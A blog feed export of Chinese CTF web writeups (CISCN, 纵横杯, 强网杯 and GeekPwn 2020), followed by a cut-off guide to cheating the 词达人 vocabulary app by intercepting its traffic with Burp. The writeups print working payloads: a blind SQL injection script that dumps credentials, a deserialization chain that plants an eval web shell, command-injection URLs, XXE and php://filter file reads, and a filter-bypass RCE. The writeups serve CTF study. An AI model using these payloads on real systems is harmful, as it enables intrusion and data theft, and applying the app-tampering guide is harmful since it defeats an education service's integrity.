#改变标准输出的默认编码,否则s.text不能输出<br>ss = &quot;&quot;<br>x = string.printable<br>​<br>url = &quot;http://10.3.120.24/?c=UserLogin&amp;f=login&quot;<br>​<br>​<br>payload=&#123;<br>    &quot;username&quot;:&quot;&quot;,<br>    &quot;password&quot;:&quot;123&quot;<br>&#125;<br>#测试<br># r=requests.post(url,data=payload)<br># print(r.text)<br>​<br>for i in range(1,60):<br>    for j in x:<br>        #payload[&quot;username&quot;]=(&quot;123&#x27;/**/and/**/1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%s,1))=%s)=1%23&quot;)%(str(i),ord(j))<br>        #payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1)#&quot;).format(str(i),str(j))<br>        #payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;),sleep(5),0)#&quot;).format(str(i),ord(j))<br>        #table : user<br>        #payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;user&#x27;)),%s,1))=%s),sleep(5),0)#&quot;)%(str(i),ord(j))<br>        payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF((ascii(substr((select(group_concat(username,password))from(user)),%s,1))=%s),sleep(5),0)#&quot;)%(str(i),ord(j))<br>        # admin Admin@12999...<br>        #print(payload)<br>        try:<br>            r = requests.post(url=url,data=payload,timeout=3)<br>            print( r.text)<br>        except requests.exceptions.Timeout as e:<br>            ss += j<br>            print(ss)<br>            break<br>​<br></code></pre></td></tr></table></figure><p>最后得到表：user，列名：userid,username,password,<br>然后再提取数据，得到用户名admin密码Admin@12999…</p><p>登录后得到flag：<code>flag&#123;ba4oy6nwovvkz8fdxjz90geghdpstywu&#125;</code></p><h3 id="Be-Careful"><a href="#Be-Careful" class="headerlink" title="Be_Careful"></a>Be_Careful</h3><p>从<code>http://10.3.120.25/index.php?file=1.php</code>很容易看出是文件包含</p><p>伪协议读index.php源码，发现提示real_flag.php</p><p>同样提取real_flag.php的源码</p><p>发现只需要把69563214562转为十六进制即可绕过，</p><p>即访问：<code>?a=0x10324a6ae2</code>得到flag</p><p><code>flag&#123;ny2w6iezylnlamxfijufowhcpevjqdzd&#125;</code></p><h3 id="flagin"><a href="#flagin" class="headerlink" title="flagin"></a>flagin</h3><p>从post给dolongin.php的数据可以看到是xml格式的</p><p>那么自然想到利用xxe读文件</p><p>起初试了一下读取/etc/passwd，可以读到。</p><p>同样试了读取/flag，没有内容，</p><p>读/flag.txt提示姿势不对。</p><p>最后通过php伪协议读flag.txt文件</p><p><code>php://filter/read=convert.base64-encode/resource=/flag.txt</code></p><p>成功读到，解码后得到flag</p><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>吐槽一下Console的那个guest/guest弱口令：对不起，是我字典不够强，不够充分，我太菜了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>ctf</tag>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>纵横杯2020-WRITEUP</title>
    <link href="/2020/12/27/zongheng-wp.html"/>
    <url>/2020/12/27/zongheng-wp.html</url>
    
    <content type="html"><![CDATA[<h1 id="纵横杯WRITEUP"><a href="#纵横杯WRITEUP" class="headerlink" title="纵横杯WRITEUP"></a><strong>纵横杯WRITEUP</strong></h1><p>纵横杯的wp版权不仅仅属于本人，转载请注明来源。</p><h1 id="马赛克"><a href="#马赛克" class="headerlink" title="马赛克"></a>马赛克</h1><h2 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h2><p>根据题目mosaic以及得到的马赛克图片</p><p>利用工具Depix</p><p>github地址：<a href="https://github.com/beurtschipper/Depix">https://github.com/beurtschipper/Depix</a></p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs python">python depix.py -p mosaic.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o flag.png<br></code></pre></td></tr></table></figure><p><img src="/images/Kgc41JQDHcI1qFQk.png!thumbnail" alt="图片"></p><p>成功得到flag.png</p><p>打开是：</p><p><img src="https://uploader.shimo.im/f/eV9jy9AvIp7oqYme.png!thumbnail?fileGuid=MKnRiUUP7yE3zW1Y" alt="图片"></p><p>根据题目信息，包裹字符串</p><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;0123468abd68abd0123&#125;<br></code></pre></td></tr></table></figure><h1 id="Web-ezcms"><a href="#Web-ezcms" class="headerlink" title="Web-ezcms"></a><strong>Web-ezcms</strong></h1><h2 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h2><p>扫描得到源代码<a href="http://www.zip">www.zip</a></p><p>下载后与官方版本对比，发现此处不同，猜测是ssrf：</p><p><img src="/images/WcWYwvdQT2ZqY0Ya.png!thumbnail" alt="图片"></p><p>根据注释得知是采集功能。</p><p>同时根据config.php的数据库密码是admin868,那么试了一下后台也是这个密码。</p><p>于此同时在github上也发现了对应的ssrf的issue：</p><p><a href="https://github.com/yzmcms/yzmcms/issues/53">https://github.com/yzmcms/yzmcms/issues/53</a></p><p>进入后台直奔采集功能，看了一下yzmcms的文档，把<a href="http://127.0.0.1/">http://127.0.0.1/</a>当作采集目标。</p><p>然后修改系统设置的统计代码为<a href="httpxxx://../../../../../../flag">jeseniscool</a></p><p>那么按如下配置即可采集到我们自定义的链接：</p><p><img src="/images/jaRag7YuYmni7jfA.png!thumbnail" alt="图片"></p><p>根据issue，可以看到，当scheme为未知协议时候会变成null，代表file协议。</p><p>试了读取etc/passwd成功了，</p><p>那么顺理成章读到flag文件</p><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;3578aa8d-3fab-4042-988c-e94c8bcd127b&#125;<br></code></pre></td></tr></table></figure><h1 id="Web-hello-php"><a href="#Web-hello-php" class="headerlink" title="Web-hello_php"></a><strong>Web-hello_php</strong></h1><h2 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h2><p>扫描得到源代码<a href="http://www.zip">www.zip</a></p><p>下载后进行审计，发现是后台上传（密码admin/admin888）phar</p><p>然后前台img利用phar://xxxxxxxxxxxx/ + 爆破文件名（十位时间戳很好爆破）+ file_exsits()进行触发。</p><p><a href="http://eci-2ze3qpk9e6qoiveebamt.cloudeci1.ichunqiu.com/?img=phar:///var/www/html/static/920827b634efb6f03d85bf5dc072cb4d.jpg">http://eci-2ze3qpk9e6qoiveebamt.cloudeci1.ichunqiu.com/?img=phar:///var/www/html/static/920827b634efb6f03d85bf5dc072cb4d.jpg</a></p><p>就这样，先写了个shell，</p><p>写完shell之后，直接post: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">jesen=echo(file_get_contents(&quot;/flag&quot;));<br></code></pre></td></tr></table></figure><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;376eb548-2f8a-4e5d-952f-6d130a300072&#125;<br></code></pre></td></tr></table></figure><h1 id="Web-大家一起来审代码"><a href="#Web-大家一起来审代码" class="headerlink" title="Web-大家一起来审代码"></a><strong>Web-</strong>大家一起来审代码</h1><h2 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h2><p>源代码<a href="http://www.zip">www.zip</a></p><p>下载后进行搜索，搜索到已有代码审计的文章：<a href="https://www.freebuf.com/vuls/241106.html">https://www.freebuf.com/vuls/241106.html</a></p><p>后台是弱密码（密码admin/admin）</p><p>发现admin_weixin.php符合freebuf文章里面的后台RCE2，因此按照他给的构造，</p><p>我这里自定义了参数是dpic。</p><p>我让（记得url编码，否则会出现问题）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dpic=&quot;);?&gt;&lt;?php $_=`/b?n/c?? /fl?g`; ?&gt;&lt;?=$_?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/HpizB2NaZQrohnjS.png!thumbnail" alt="图片"></p><p>就这样，直接就得到了flag</p><p><img src="/images/KbixtkRGwClWGX8b.png!thumbnail" alt="图片"></p><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;5e20e6fb-cf3c-44f9-b605-c65d90cc77a9&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>writeup</tag>
      
      <tag>纵横杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2020部分writeup</title>
    <link href="/2020/08/24/qwb2020.html"/>
    <url>/2020/08/24/qwb2020.html</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯2020部分writeup"><a href="#强网杯2020部分writeup" class="headerlink" title="强网杯2020部分writeup"></a>强网杯2020部分writeup</h1><h3 id="强网先锋-web辅助"><a href="#强网先锋-web辅助" class="headerlink" title="强网先锋 web辅助"></a><strong>强网先锋 web辅助</strong></h3><p>给了源码那就直接审计源码，构造利用链：</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;common.php&quot;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">topsolo</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">midsolo</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">jungle</span>(<span class="hljs-string">&quot;Yasuo&quot;</span>))) ;<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;n\\61me&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;s:7:&quot;</span>,<span class="hljs-string">&quot;S:7:&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;midsolo\&quot;:1&quot;</span>,<span class="hljs-string">&quot;\&quot;midsolo\&quot;:2&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要注意以下，midsolo的__wakeup会把name强制变成Yasuo，利用经典CVE绕过</p><p>还有需要注意，name这个字符串被check()函数拦截了，所以需要利用hex绕过过滤，然后把小写的s改成大写，小写的s是不会把\61识别hex的。然后就是字符串溢出了，关于溢出多少这个在本地试了很久.</p><p>最终payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span>eci-<span class="hljs-number">2</span>ze9cia09xafs2dqysyx.cloudeci1.ichunqiu.com/?username=\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>*\<span class="hljs-number">0</span>&amp;password=ccc<span class="hljs-string">&quot;;s:8:&quot;</span>\<span class="hljs-number">0</span>*\0admin<span class="hljs-string">&quot;;i:1;s:7:&quot;</span>\<span class="hljs-number">0</span>*\0pass<span class="hljs-string">&quot;;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00n%5C61ee%22%3BO%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00n%5C61me%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00n%5C61me%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00n%5C61me%22%3Bs%3A5%3A%22Yasuo%22%3B%7D%7D%7D%7D</span><br></code></pre></td></tr></table></figure><p>这样就结束了，成功getflag</p><h3 id="强网先锋-主动"><a href="#强网先锋-主动" class="headerlink" title="强网先锋 主动"></a><strong>强网先锋 主动</strong></h3><p>先利用;执行多条命令，先找一下flag在哪里</p><p><code>http://39.96.23.228:10002/?ip=0;find / -name fla*</code></p><p>找到了：</p><p><img src="/images/za0aBPzTBDEtjiav__thumbnail.png" alt="img"></p><p>那么就直接读取:</p><p><code>http://39.96.23.228:10002/?ip=0;cat /var/www/html/fla*</code></p><p>这里用*是为了绕过正则表达式</p><p>查看源代码得到flag</p><p><img src="/images/2J5jOFBpjMBDGUPM__thumbnail.png" alt="img"></p><h3 id="强网先锋-upload"><a href="#强网先锋-upload" class="headerlink" title="强网先锋 upload"></a><strong>强网先锋 upload</strong></h3><p>给了个wireshark的数据包很明显看到post到了一个图片，导出来。看到post的地址为/steghide.php还有一个hint: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--i use steghide with a good password--&gt;</span><br></code></pre></td></tr></table></figure><p>猜测应该是弱密码果然，打开kali，试了一下123456成功解开，</p><p><code>steghide extract -sf steghide.jpg</code></p><p>里面有flag.txt就是flag</p><h3 id="强网先锋-Funhash"><a href="#强网先锋-Funhash" class="headerlink" title="强网先锋 Funhash"></a><strong>强网先锋 Funhash</strong></h3><p>hash1的话需要爆破</p><p>跑了半个小时左右发现0e251288019的md4也是0e251288019那么hash1就成功了</p><p>到了hash2和hash3</p><p><code>/?hash1=0e251288019&amp;hash2=&amp;hash4=ffifdyop</code></p><p>我只传了hash2，那么hash2就是空字符串，hash3就是NULL，成功跳过第2关</p><p>第三关是参考了：<a href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p><p>成功getflag</p><h5 id="至于其他的。。。-我太菜了，其他的都没做出来。"><a href="#至于其他的。。。-我太菜了，其他的都没做出来。" class="headerlink" title="至于其他的。。。 我太菜了，其他的都没做出来。"></a>至于其他的。。。 我太菜了，其他的都没做出来。</h5>]]></content>
    
    
    <categories>
      
      <category>CTf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>writeup</tag>
      
      <tag>强网杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2020 初赛WEB writeup</title>
    <link href="/2020/08/24/ciscncs.html"/>
    <url>/2020/08/24/ciscncs.html</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2020-初赛WEBwriteup"><a href="#CISCN2020-初赛WEBwriteup" class="headerlink" title="CISCN2020 初赛WEBwriteup"></a>CISCN2020 初赛WEBwriteup</h1><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h3><p>题目给了源码</p><p>经过一番搜索（搜__destruct）找到了<code>image.php jig.php ws.php</code></p><p>查看了一番代码，发现jig.php里面有write函数，综合查看一番，是可以任意写文件的。</p><p>根据代码，写入初始化变量的值：</p><p><img src="/images/image-20200824104135895.png" alt="image-20200824104135895"></p><p>这样即可让它写到web根目录里面的shell.php中。</p><p>然后就是输出url编码的序列号字符串了：</p><p> <img src="/images/image-20200824104121782.png" alt="image-20200824104121782"></p><p>然后访问: </p><figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs js">/?flag=O%3A6%3A%22DB%5CJig%<span class="hljs-number">22</span>%3A6%3A%7Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00uuid%<span class="hljs-number">22</span>%3BN%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00dir%<span class="hljs-number">22</span>%3Bs%3A2%3A%<span class="hljs-number">22.</span>%2F%<span class="hljs-number">22</span>%3Bs%3A9%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00format%<span class="hljs-number">22</span>%3Bi%3A0%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00log%<span class="hljs-number">22</span>%3BN%3Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00data%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bs%3A9%3A%22shell.<span class="hljs-property">php</span>%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bi%3A0%3Bs%3A26%3A%<span class="hljs-number">22</span>%3C%3Fphp+<span class="hljs-built_in">eval</span>%<span class="hljs-number">28</span>%24_POST%5B%27d%<span class="hljs-number">27</span>%5D%<span class="hljs-number">29</span>%3B%3F%3E%<span class="hljs-number">22</span>%3B%7D%7Ds%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00lazy%<span class="hljs-number">22</span>%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure><p>即可成功getshell</p><p>然后通过phpinfo();查看环境变量里面的flag值即可。</p><p><img src="/images/image-20200824104108940.png" alt="image-20200824104108940"></p><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h3><p>直接给了源代码，尝试过让trick1=array(“0”) trick2=array(1)</p><p>结果发现在__destruct中把trick1强制转为了字符串，直接变成了string(5) “Array”</p><p>后来发现当浮点数过大的时候会变成INF</p><p>所以让</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;trick1 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br><span class="hljs-variable language_">$this</span>-&gt;trick2 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br></code></pre></td></tr></table></figure><p>最后得到序列化字符串：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick1&quot;</span>;d:INF;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick2&quot;</span>;d:INF;&#125;<br></code></pre></td></tr></table></figure><p>然后提交即可成功getflag</p><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h3><p>很明显考察原型链污染。</p><p>查看源码就不说了</p><p>GET访问/SpawnPoint初始化session</p><p>查看代码发现使用 set-value，该js允许使用.来设置对应key的value</p><p>那么我们可以看到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Admin</span> = &#123;<br>    <span class="hljs-string">&quot;password1&quot;</span>:process.<span class="hljs-property">env</span>.<span class="hljs-property">p1</span>,<br>    <span class="hljs-string">&quot;password2&quot;</span>:process.<span class="hljs-property">env</span>.<span class="hljs-property">p2</span>,<br>    <span class="hljs-string">&quot;password3&quot;</span>:process.<span class="hljs-property">env</span>.<span class="hljs-property">p3</span><br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">setFn</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">knight</span>, <span class="hljs-string">&quot;__proto__.password4&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br></code></pre></td></tr></table></figure><p>污染Admin这个object的键值对</p><p><img src="/images/image-20200824104400190.png" alt="image-20200824104400190"></p><p>然后再：</p><p><img src="/images/image-20200824104408894.png" alt="image-20200824104408894"></p><p>顺利得到flag</p><h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h3><p>直接给了代码，发现payload必须满足{if:xxxx}xxx{end if}格式</p><p>对于每一个xxx都会通过danger_key()过滤一下</p><p>综合一下还是采用hex2bin配合array_map绕过，把system /catflag都转成hex(array_filter也可以)</p><p>最终的payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?a=&#123;<span class="hljs-keyword">if</span>:<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&#x27;73797374656d&#x27;</span>),[<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&#x27;636174202f666c6167&#x27;</span>)])&#125;xxx&#123;end <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="另一个"><a href="#另一个" class="headerlink" title="另一个"></a>另一个</h3><p>题目忘了，没做出来，后来看了一下，让子进程异常就行了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020GeekPwn-Cosplay题解</title>
    <link href="/2020/07/12/2020GeekPwn-Cosplay.html"/>
    <url>/2020/07/12/2020GeekPwn-Cosplay.html</url>
    
    <content type="html"><![CDATA[<h1 id="2020GeekPwn-Cosplay题解"><a href="#2020GeekPwn-Cosplay题解" class="headerlink" title="2020GeekPwn-Cosplay题解"></a>2020GeekPwn-Cosplay题解</h1><p>打开即可看到上传页面，</p><p><img src="/images/image-20200712223923626.png" alt="image-20200712223923626"></p><p>按照惯例查看源代码企图获取提示，前半部分不需要看，那是腾讯COS的JSSDK部分。</p><p>（至于为什么这么觉得，完全是看了下半部分推测出来的。下半部分是jssdk的上传文件功能，此页面并没有引入其他js，所以上面的复杂混淆代码一定是cos的sdk。）</p><p>可以看到：</p><p><img src="/images/image-20200712224128098.png" alt="image-20200712224128098"></p><p>初始化实例，获取临时的key用来上传。</p><p>先看sdk的文档（参考：<a href="https://cloud.tencent.com/document/product/436/11459），发现有了key之后就可以查看cos里面的具体文件，在控制台执行即可。">https://cloud.tencent.com/document/product/436/11459），发现有了key之后就可以查看cos里面的具体文件，在控制台执行即可。</a></p><p>具体的流程为：</p><ol><li>随便上传一个文件，让js获取到tempkey。</li><li>控制台执行代码即可查看所有文件。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 查询对象列表</span><br>cos.<span class="hljs-title function_">getBucket</span>(&#123;<br>    <span class="hljs-title class_">Bucket</span>: <span class="hljs-title class_">Bucket</span>, <span class="hljs-comment">/* 必须 */</span><br>    <span class="hljs-title class_">Region</span>: <span class="hljs-title class_">Region</span>,     <span class="hljs-comment">/* 存储桶所在地域，必须字段 */</span><br>    <span class="hljs-title class_">Prefix</span>: <span class="hljs-string">&#x27;&#x27;</span>,           <span class="hljs-comment">/* 非必须 */</span><br>&#125;, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err || data.<span class="hljs-property">Contents</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>可以看到：</p><p><img src="/images/image-20200712224518339.png" alt="image-20200712224518339"></p><p>一看就是flag了。</p><p>调用文件下载api即可查看文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//文件下载</span><br>cos.<span class="hljs-title function_">getObject</span>(&#123;<br>    <span class="hljs-title class_">Bucket</span>: <span class="hljs-title class_">Bucket</span>, <span class="hljs-comment">/* 必须 */</span><br>    <span class="hljs-title class_">Region</span>: <span class="hljs-title class_">Region</span>,     <span class="hljs-comment">/* 存储桶所在地域，必须字段 */</span><br>    <span class="hljs-title class_">Key</span>: <span class="hljs-string">&#x27;f1L9@/flag.txt&#x27;</span>,              <span class="hljs-comment">/* 必须 */</span><br>&#125;, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err || data.<span class="hljs-property">Body</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/images/image-20200712224705621.png" alt="image-20200712224705621"></p><p>成功得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简简单单过词达人各种任务</title>
    <link href="/2020/03/04/jianjiandandancidaren.html"/>
    <url>/2020/03/04/jianjiandandancidaren.html</url>
    
    <content type="html"><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>本文默认你具备使用burp的能力以及对json数据格式有所了解，并且可以为手机配置代理或者对安卓模拟器进行设置. 还需要你有配置https证书的能力。</p><hr><h1 id="2020-8-26更新"><a href="#2020-8-26更新" class="headerlink" title="2020/8/26更新"></a>2020/8/26更新</h1><h3 id="好像均已失效"><a href="#好像均已失效" class="headerlink" title="好像均已失效"></a>好像均已失效</h3><h1 id="2020-3-22更新"><a href="#2020-3-22更新" class="headerlink" title="2020/3/22更新"></a>2020/3/22更新</h1><p><img src="/images/image-20200322134517924.png" alt="image-20200322134517924"></p><h4 id="很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。"><a href="#很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。" class="headerlink" title="很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。"></a>很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。</h4><p>所以我们需要往您的手机导入安卓证书，这里操作如下。</p><p>访问代理ip地址，如我burp的ip地址为 172.16.20.107 端口为8080 那么我就访问<a href="http://172.16.20.107:8080/">http://172.16.20.107:8080/</a></p><p>点击右上角 CA cert*** 下载证书，下载的文件是der格式的，手机可能无法直接打开，需要改成cacert.crt就是把der改成crt文件。 具体操作参见：<a href="https://blog.csdn.net/wst0717/article/details/83787153">https://blog.csdn.net/wst0717/article/details/83787153</a></p><p><font color="green">注：导入后手机的状态栏会提示:网络可能会受到监控，正常现象</font></p><p>打开进行安装即可。这里不再截图。</p><p>然后现在只能改答案为true来欺骗客户端了，想改分需要拿到sign参数的具体文件，我有点懒，就不发出来了。。</p><p><font color="blue">祝你们好运！</font></p><h4 id="不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。"><a href="#不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。" class="headerlink" title="不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。"></a>不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。</h4><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="1-启动burpsuite2-1版本"><a href="#1-启动burpsuite2-1版本" class="headerlink" title="1.启动burpsuite2.1版本"></a>1.启动burpsuite2.1版本</h2><p>修改监听地址为:0.0.0.0:8080(本人在用这个，不想用这个也可以不用)</p><p><img src="/images/image-20200304212731446.png" alt="image-20200304212731446"></p><p><img src="/images/image-20200304212713261.png" 